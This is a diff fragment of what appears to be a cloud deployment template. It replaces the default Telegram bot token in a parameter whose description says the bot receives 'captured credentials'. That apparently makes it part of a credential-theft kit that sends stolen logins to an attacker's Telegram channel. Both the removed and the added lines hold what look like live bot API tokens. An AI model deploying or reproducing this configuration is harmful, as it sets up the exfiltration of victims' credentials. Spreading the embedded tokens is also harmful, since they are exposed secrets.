@@ -37,7 +37,7 @@
         },
         "telegramBotToken": {
             "type": "String",
-            "defaultValue": "8760078154:AAH-bEQTQFXiiniIEnbvIS-39UzO-tmBlpM",
+            "defaultValue": "8931684987:AAFntzbPFFe3sJWOXxOcoFatqTmzNIlfjNg",
             "metadata": {
                 "description": "Telegram Bot API token (from @BotFather) for captured credentials"
             }
